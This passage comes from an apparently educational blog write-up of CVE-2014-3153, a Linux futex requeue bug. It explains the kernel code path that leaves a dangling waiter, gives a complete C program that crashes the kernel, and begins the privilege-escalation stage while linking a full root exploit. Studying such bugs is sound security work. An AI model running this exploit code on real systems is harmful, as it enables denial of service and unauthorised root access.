+ */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">futex_proxy_trylock_atomic</span><span class="p">(</span><span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">pifutex</span><span class="p">,</span>
+				 <span class="k">struct</span> <span class="n">futex_hash_bucket</span> <span class="o">*</span><span class="n">hb1</span><span class="p">,</span>
+				 <span class="k">struct</span> <span class="n">futex_hash_bucket</span> <span class="o">*</span><span class="n">hb2</span><span class="p">,</span>
+				 <span class="k">union</span> <span class="n">futex_key</span> <span class="o">*</span><span class="n">key1</span><span class="p">,</span> <span class="k">union</span> <span class="n">futex_key</span> <span class="o">*</span><span class="n">key2</span><span class="p">,</span>
+				 <span class="k">struct</span> <span class="n">futex_pi_state</span> <span class="o">**</span><span class="n">ps</span><span class="p">,</span> <span class="kt">int</span> <span class="n">set_waiters</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">futex_q</span> <span class="o">*</span><span class="n">top_waiter</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	<span class="n">u32</span> <span class="n">curval</span><span class="p">;</span>
+	<span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">...</span>
+	<span class="n">top_waiter</span> <span class="o">=</span> <span class="n">futex_top_waiter</span><span class="p">(</span><span class="n">hb1</span><span class="p">,</span> <span class="n">key1</span><span class="p">);</span>
+
+	<span class="cm">/* There are no waiters, nothing for us to do. */</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">top_waiter</span><span class="p">)</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="cm">/* Ensure we requeue to the expected futex. */</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">match_futex</span><span class="p">(</span><span class="n">top_waiter</span><span class="o">-&gt;</span><span class="n">requeue_pi_key</span><span class="p">,</span> <span class="n">key2</span><span class="p">))</span>
+		<span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+	<span class="cm">/*
+	 * Try to take the lock for top_waiter.  Set the FUTEX_WAITERS bit in
+	 * the contended case or if set_waiters is 1.  The pi_state is returned
+	 * in ps in contended cases.
+	 */</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">futex_lock_pi_atomic</span><span class="p">(</span><span class="n">pifutex</span><span class="p">,</span> <span class="n">hb2</span><span class="p">,</span> <span class="n">key2</span><span class="p">,</span> <span class="n">ps</span><span class="p">,</span> <span class="n">top_waiter</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span>
+				   <span class="n">set_waiters</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+		<span class="n">requeue_pi_wake_futex</span><span class="p">(</span><span class="n">top_waiter</span><span class="p">,</span> <span class="n">key2</span><span class="p">,</span> <span class="n">hb2</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Pay attention to how it ensures that the <code class="language-plaintext highlighter-rouge">requeue_pi_key</code> of the <code class="language-plaintext highlighter-rouge">top_waiter</code> is equal to the requeue’s target futex’s key.
+This is why we need to <strong>self-requeue</strong>, and why it <em>wouldn’t</em> be sufficient to just set the value of a different futex in userspace to <code class="language-plaintext highlighter-rouge">0</code> and requeue to it.</p>
+
+<p>So the requirements for triggering the bug are:</p>
+<ol>
+  <li>The target futex from the <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> remains.</li>
+  <li>There’s a waiter that is actively contending on the source futex.</li>
+</ol>
+
+<p>The only scenario that meets both these terms is a self-requeue.</p>
+
+<p>Other than that, basically all it does is call <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L718"><code class="language-plaintext highlighter-rouge">futex_lock_pi_atomic()</code></a> and if the lock was acquired,<br />
+wake up the top waiter of the source futex.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">futex_lock_pi_atomic</span><span class="p">(</span><span class="n">u32</span> <span class="n">__user</span> <span class="o">*</span><span class="n">uaddr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">futex_hash_bucket</span> <span class="o">*</span><span class="n">hb</span><span class="p">,</span>
+				<span class="k">union</span> <span class="n">futex_key</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
+				<span class="k">struct</span> <span class="n">futex_pi_state</span> <span class="o">**</span><span class="n">ps</span><span class="p">,</span>
+				<span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">,</span> <span class="kt">int</span> <span class="n">set_waiters</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="kt">int</span> <span class="n">lock_taken</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">force_take</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">u32</span> <span class="n">uval</span><span class="p">,</span> <span class="n">newval</span><span class="p">,</span> <span class="n">curval</span><span class="p">,</span> <span class="n">vpid</span> <span class="o">=</span> <span class="n">task_pid_vnr</span><span class="p">(</span><span class="n">task</span><span class="p">);</span>
+
+<span class="nl">retry:</span>
+	<span class="n">ret</span> <span class="o">=</span> <span class="n">lock_taken</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="cm">/*
+	 * To avoid races, we attempt to take the lock here again
+	 * (by doing a 0 -&gt; TID atomic cmpxchg), while holding all
+	 * the locks. It will most likely not succeed.
+	 */</span>
+	<span class="n">newval</span> <span class="o">=</span> <span class="n">vpid</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">set_waiters</span><span class="p">)</span>
+		<span class="n">newval</span> <span class="o">|=</span> <span class="n">FUTEX_WAITERS</span><span class="p">;</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">cmpxchg_futex_value_locked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">curval</span><span class="p">,</span> <span class="n">uaddr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">newval</span><span class="p">)))</span>
+		<span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
+	<span class="p">...</span>
+	<span class="cm">/*
+	 * Surprise - we got the lock. Just return to userspace:
+	 */</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">curval</span><span class="p">))</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">...</span>
+</code></pre></div></div>
+
+<p>The function attempts to <a href="https://wiki.osdev.org/Atomic_operation">atomically</a> compare-and-exchange the futex-word.
+It compares it to <code class="language-plaintext highlighter-rouge">0</code> which is the value that signals the lock is free and exchanges it with the task’s PID.</p>
+
+<p>This operation is <code class="language-plaintext highlighter-rouge">unlikely</code> to succeed because the user could’ve done it in userspace and avoid the expensive syscall,
+therefore the assumption is that the user wasn’t able to retrieve the lock in userspace and needed the kernel’s “help”.
+That’s why it would be a “surprise” in case it <em>was able</em> to get the lock.</p>
+
+<p>Recalling the function above, if we successfully took control of the lock, we’d wake the top waiter,
+which is the waiter that was added to the waiters list on the first requeue (step 3).<br />
+Because we overwrote the value in userspace (step 4), the function <strong>succeeds and wakes the waiter</strong>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ret</span> <span class="o">=</span> <span class="n">futex_lock_pi_atomic</span><span class="p">(</span><span class="n">pifutex</span><span class="p">,</span> <span class="n">hb2</span><span class="p">,</span> <span class="n">key2</span><span class="p">,</span> <span class="n">ps</span><span class="p">,</span> <span class="n">top_waiter</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span>
+				   <span class="n">set_waiters</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
+		<span class="n">requeue_pi_wake_futex</span><span class="p">(</span><span class="n">top_waiter</span><span class="p">,</span> <span class="n">key2</span><span class="p">,</span> <span class="n">hb2</span><span class="p">);</span>
+</code></pre></div></div>
+<p>When <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L1264"><code class="language-plaintext highlighter-rouge">futex_requeue()</code></a> wakes up the waiter,
+it sets the <code class="language-plaintext highlighter-rouge">rt_waiter</code> to <code class="language-plaintext highlighter-rouge">NULL</code> in order to signal <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a> that the atomic lock acquisition was successful.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span>
+<span class="kt">void</span> <span class="nf">requeue_pi_wake_futex</span><span class="p">(</span><span class="k">struct</span> <span class="n">futex_q</span> <span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="k">union</span> <span class="n">futex_key</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
+			   <span class="k">struct</span> <span class="n">futex_hash_bucket</span> <span class="o">*</span><span class="n">hb</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">get_futex_key_refs</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
+	<span class="n">q</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>
+
+	<span class="n">__unqueue_futex</span><span class="p">(</span><span class="n">q</span><span class="p">);</span>
+
+	<span class="n">WARN_ON</span><span class="p">(</span><span class="o">!</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">rt_waiter</span><span class="p">);</span>
+	<span class="n">q</span><span class="o">-&gt;</span><span class="n">rt_waiter</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// Right here.</span>
+
+	<span class="n">q</span><span class="o">-&gt;</span><span class="n">lock_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">hb</span><span class="o">-&gt;</span><span class="n">lock</span><span class="p">;</span>
+
+	<span class="c1">// Start scheduling the task again.</span>
+	<span class="n">wake_up_state</span><span class="p">(</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">task</span><span class="p">,</span> <span class="n">TASK_NORMAL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Its usage is seen here within <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/futex.c#L2285"><code class="language-plaintext highlighter-rouge">futex_wait_requeue_pi()</code></a>.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Check if the requeue code acquired the second futex for us. */</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">q</span><span class="p">.</span><span class="n">rt_waiter</span><span class="p">)</span> <span class="p">{</span>
+		<span class="cm">/*
+		 * Got the lock. We might not be the anticipated owner if we
+		 * did a lock-steal - fix up the PI-state in that case.
+		 */</span>
+		 <span class="p">...</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="cm">/*
+		 * We have been woken up by futex_unlock_pi(), a timeout, or a
+		 * signal.  futex_unlock_pi() will not destroy the lock_ptr nor
+		 * the pi_state.
+		 */</span>
+		 <span class="p">...</span>
+		 <span class="c1">// Removes the waiter from the wait_list.</span>
+		<span class="n">ret</span> <span class="o">=</span> <span class="n">rt_mutex_finish_proxy_lock</span><span class="p">(</span><span class="n">pi_mutex</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rt_waiter</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+		<span class="p">...</span>
+		<span class="cm">/* Unqueue and drop the lock. */</span>
+		<span class="n">unqueue_me_pi</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="p">);</span>
+	<span class="p">}</span>
+</code></pre></div></div>
+<p>And as we can see, <a href="https://elixir.bootlin.com/linux/v3.11.4/source/kernel/rtmutex.c#L1033"><code class="language-plaintext highlighter-rouge">rt_mutex_finish_proxy_lock()</code></a> is <em>not</em> being called since <code class="language-plaintext highlighter-rouge">rt_waiter</code> is <code class="language-plaintext highlighter-rouge">NULL</code>,
+and therefore the waiter is kept as-is within the waiters list.</p>
+
+<h4 id="recap">Recap</h4>
+<p>We start off by locking a PI-futex.
+Then we simply requeue a thread to it which creates a waiter entry on the futex’s waiters list.
+Afterwards, we overwrite the futex-word with <code class="language-plaintext highlighter-rouge">0</code>. Once we’ll requeue the waiting thread onto itself,
+the attempt to atomically own the lock and wake the top waiter on the source (which is also the destination) futex succeeds.</p>
+
+<p><img src="https://i.imgur.com/0qp366z.png" alt="Recap Image" /></p>
+
+<p>This leaves us with a dangling waiter on the waiters list whose thread has continued and is up and running.
+Now, the waiter entry points to garbage kernel stack memory. The original <code class="language-plaintext highlighter-rouge">rt_waiter</code> is long gone and was destroyed by other function calls on the stack.</p>
+
+<p><img src="https://i.imgur.com/Dael9DR.png" alt="Bugged Waiter Image" /></p>
+
+<p>Our waiter, a node in the waiters list, is now completely corrupted.</p>
+
+<h1 id="building-the-kernel">Building The Kernel</h1>
+<p>I won’t go too in depth as to how I built the kernel, since there are a milion of tutorials out there on how to do that.
+I’d merely state that I’ve been using an 3.11.4-i386 kernel for this exploit that I compiled on a Xenial (Ubuntu 16.04) Docker container.</p>
+
+<p>The only actual hassle was getting my hands on the right <code class="language-plaintext highlighter-rouge">gcc</code> version for the according kernel version that I worked on.
+I compared the <a href="https://gcc.gnu.org/releases.html">GCC releases</a> with the <a href="https://en.wikipedia.org/wiki/Linux_kernel_version_history">Linux kernel version</a> history and tried various versions that seemed to fit by release date.
+Ultimately <code class="language-plaintext highlighter-rouge">gcc-5</code> was what did the job for me.</p>
+
+<p>It would be virtually impossible to do all of that without building your own kernel.<br />
+The ability to debug the code and add your own logs within the code is indescribable.</p>
+
+<p>For actually running the kernel, I’ve used QEMU as my emulator.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Now’s the time for the actual fun.</p>
+
+<p>Eventually, our goal would be to escalate to <code class="language-plaintext highlighter-rouge">root</code> privileges.<br />
+The way we’d do that is by achieving arbitrary read &amp; write within the kernel’s memory,
+and then overwrite our process’ <a href="https://elixir.bootlin.com/linux/v3.11.4/source/include/linux/cred.h#L102"><code class="language-plaintext highlighter-rouge">cred</code></a> struct which dictates the security context of a task.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
+	<span class="n">atomic_t</span>	<span class="n">usage</span><span class="p">;</span>
+	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
+	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
+	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
+	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
+	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
+	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
+	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
+	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
+	<span class="kt">unsigned</span>	<span class="n">securebits</span><span class="p">;</span>	<span class="cm">/* SUID-less security management */</span>
+	<span class="n">kernel_cap_t</span>	<span class="n">cap_inheritable</span><span class="p">;</span> <span class="cm">/* caps our children can inherit */</span>
+	<span class="n">kernel_cap_t</span>	<span class="n">cap_permitted</span><span class="p">;</span>	<span class="cm">/* caps we're permitted */</span>
+	<span class="n">kernel_cap_t</span>	<span class="n">cap_effective</span><span class="p">;</span>	<span class="cm">/* caps we can actually use */</span>
+	<span class="n">kernel_cap_t</span>	<span class="n">cap_bset</span><span class="p">;</span>	<span class="cm">/* capability bounding set */</span>
+	<span class="n">kernel_cap_t</span>	<span class="n">cap_ambient</span><span class="p">;</span>	<span class="cm">/* Ambient capability set */</span>
+	<span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The most fundamental members of <code class="language-plaintext highlighter-rouge">cred</code> are presumably the real <code class="language-plaintext highlighter-rouge">uid</code> and <code class="language-plaintext highlighter-rouge">gid</code>,
+but it also stores other properties such as the task’s <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities</a> and many other.</p>
+
+<p>Although how would we go about it by solely having a wild reference to that waiter?<br />
+Quite frankly, the idea is fairly simple. There’s nothing new about corrupting a node within a linked list in order to gain read and write capabilities.
+Same applies here. We’d need to find a way to write to that dangling waiter,
+and then perform certain operations on it so that the kernel would do as we please.</p>
+
+<h4 id="kernel-crash">Kernel Crash</h4>
+
+<p>But let’s start small. For now we’ll just attempt to crash the kernel.</p>
+
+<p>I wrote a program that implements the steps that we listed above.<br />
+Let’s analyze it before going into the actual exploitation.
+Here’s the <a href="https://github.com/elongl/CVE-2014-3153/blob/master/kernel_crash.c">code</a>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define CRASH_SEC 3
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">futexes</span><span class="p">;</span>
+    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="o">*</span><span class="n">pi_futex</span><span class="p">;</span>
+
+    <span class="n">assert</span><span class="p">((</span><span class="n">futexes</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">non_pi_futex</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">futexes</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="n">pi_futex</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">futexes</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="n">flock</span><span class="p">(</span><span class="n">pi_futex</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">fwait_requeue</span><span class="p">(</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Child continues."</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Kernel will crash in %u seconds...</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">CRASH_SEC</span><span class="p">);</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="n">CRASH_SEC</span><span class="p">);</span>
+
+    <span class="n">frequeue</span><span class="p">(</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="o">*</span><span class="n">pi_futex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">frequeue</span><span class="p">(</span><span class="n">pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">flock</code>, <code class="language-plaintext highlighter-rouge">fwait_requeue</code>, and the <code class="language-plaintext highlighter-rouge">frequeue</code> functions are implemented in a small <a href="https://github.com/elongl/CVE-2014-3153/blob/master/futex.c">futex wrappers</a> file that I’ve created for simplification and ease on the eyes.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">futexes</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We start off by allocating <code class="language-plaintext highlighter-rouge">sizeof(uint32_t) * 2</code> of R/W memory which is our two futexes.<br />
+Mind the <code class="language-plaintext highlighter-rouge">MAP_SHARED</code> flag that is being passed to <code class="language-plaintext highlighter-rouge">mmap</code> call in order to signal that the memory
+needs to be shared among the main process and the process that is spawned from the <code class="language-plaintext highlighter-rouge">fork()</code> call.</p>
+
+<p><em>Side-comment</em>: In the actual exploit you’d see that I’m using <code class="language-plaintext highlighter-rouge">pthreads</code> rather than <code class="language-plaintext highlighter-rouge">fork()</code> which makes the code much clearer,
+and there’s no need to map a shared address space since all threads point to the same virtual address space.</p>
+
+<ol>
+  <li>
+    <p>Locking the <code class="language-plaintext highlighter-rouge">pi_futex</code>.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">flock</span><span class="p">(</span><span class="n">pi_futex</span><span class="p">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Spawn a child process and call <code class="language-plaintext highlighter-rouge">FUTEX_WAIT_REQUEUE_PI</code> from <code class="language-plaintext highlighter-rouge">non_pi_futex</code> to <code class="language-plaintext highlighter-rouge">pi_futex</code>.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">assert</span><span class="p">((</span><span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">())</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pid</span><span class="p">)</span>
+     <span class="p">{</span>
+         <span class="n">fwait_requeue</span><span class="p">(</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+         <span class="n">puts</span><span class="p">(</span><span class="s">"Child continues."</span><span class="p">);</span>
+         <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
+     <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>We only <code class="language-plaintext highlighter-rouge">sleep</code> to assure that the <code class="language-plaintext highlighter-rouge">fwait_requeue</code> of the child process had already been issued.
+Afterwards, we requeue the waiter to the <code class="language-plaintext highlighter-rouge">pi_futex</code>.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">sleep</span><span class="p">(</span><span class="n">CRASH_SEC</span><span class="p">);</span>
+ <span class="n">frequeue</span><span class="p">(</span><span class="n">non_pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Overwrite the userspace value of the <code class="language-plaintext highlighter-rouge">pi_futex</code> to <code class="language-plaintext highlighter-rouge">0</code>.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">*</span><span class="n">pi_futex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Self-requeue.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">frequeue</span><span class="p">(</span><span class="n">pi_futex</span><span class="p">,</span> <span class="n">pi_futex</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Now let’s see this in action.</p>
+
+<center><iframe style="width: 720px; height: 400px; margin: 0.5rem" src="https://www.youtube.com/embed/DxPt1MNPDpY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></center>
+
+<p>If you paid attention to the call trace,
+you would spot that the kernel crashes once the process itself terminates (<code class="language-plaintext highlighter-rouge">do_exit</code>).
+What happens is that the kernel attempts to cleanup the process’ resources (<code class="language-plaintext highlighter-rouge">mm_release</code>), specifically the PI state list (<code class="language-plaintext highlighter-rouge">exit_pi_state_list</code>),
+and when it attempts to do so, it unlocks all the futexes that the process holds.
+During the process of releasing them, the kernel tries to unlock our corrupted waiter as well which causes a crash.</p>
+
+<p>To be more accurate, it occurs here.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kr">inline</span> <span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span>
+<span class="nf">rt_mutex_top_waiter</span><span class="p">(</span><span class="k">struct</span> <span class="n">rt_mutex</span> <span class="o">*</span><span class="n">lock</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">struct</span> <span class="n">rt_mutex_waiter</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
+
+	<span class="n">w</span> <span class="o">=</span> <span class="n">plist_first_entry</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lock</span><span class="o">-&gt;</span><span class="n">wait_list</span><span class="p">,</span> <span class="k">struct</span> <span class="n">rt_mutex_waiter</span><span class="p">,</span>
+			       <span class="n">list_entry</span><span class="p">);</span>
+	<span class="n">BUG_ON</span><span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">lock</span> <span class="o">!=</span> <span class="n">lock</span><span class="p">);</span> <span class="c1">// &lt;-- KERNEL BUG</span>
+
+	<span class="k">return</span> <span class="n">w</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The function compares the lock that the top waiter claims it waits on to the actual lock.
+Because the waiter is completely bugged,
+it’s <code class="language-plaintext highlighter-rouge">lock</code> member no longer points to the relating <code class="language-plaintext highlighter-rouge">rt_mutex</code> and therefore causes a crash.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>DOSing the system is pretty cool, but let’s make it more interesting by escalating to <code class="language-plaintext highlighter-rouge">root</code> privileges.</p>
+
+<p>I intentionally do not post the entire exploit in advance because that would most likely be too overwhelming.
+Instead, I’ll append code blocks by stages.<br />
+If you do prefer to have the entire exploit available in hand, it can be found <a href="https://github.com/elongl/CVE-2014-3153/blob/master/privilege_escalation.c">here</a>.</p>
+
+<h4 id="writing-to-the-waiter">Writing To The Waiter</h4>
+<p>In order to make use of our dangling waiter, we’d first need to find a way to write to it.<br />
+A quick reminder, our waiter is placed on the kernel stack.
+With that in mind, we need to somehow be able to write a controlled buffer to the place the waiter was held within the stack.
+Given that we’re just a userspace program, our way of writing data to the kernel’s stack is by issuing System Calls.</p>
+
+<p>But how do we know which syscall to invoke?<br />
+Luckily for us, the kernel comes with a useful tool called <code class="language-plaintext highlighter-rouge">checkstack</code>.<br />
+It can be found within the source under <code class="language-plaintext highlighter-rouge">scripts/checkstack.pl</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -d vmlinux | ./scripts/checkstack.pl i386 | grep -E "(futex_wait_requeue_pi|sys)"
+
+0xc11206e6 do_sys_poll [vmlinux]:                       932
+0xc1120aa3 do_sys_poll [vmlinux]:                       932
+...
+0xc1527388 ___sys_sendmsg [vmlinux]:                    248
+0xc15274d8 ___sys_sendmsg [vmlinux]:                    248
+0xc1527b1a ___sys_recvmsg [vmlinux]:                    220
+0xc1527c6b ___sys_recvmsg [vmlinux]:                    220
+0xc1087936 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
+0xc1087a80 futex_wait_requeue_pi.constprop.21 [vmlinux]:212
+0xc1529828 __sys_sendmmsg [vmlinux]:                    184
+0xc15298fe __sys_sendmmsg [vmlinux]:                    184
+...
+</code></pre></div></div>
+<p>The script lists the stack depth, size of stack frame, of each function within the kernel.
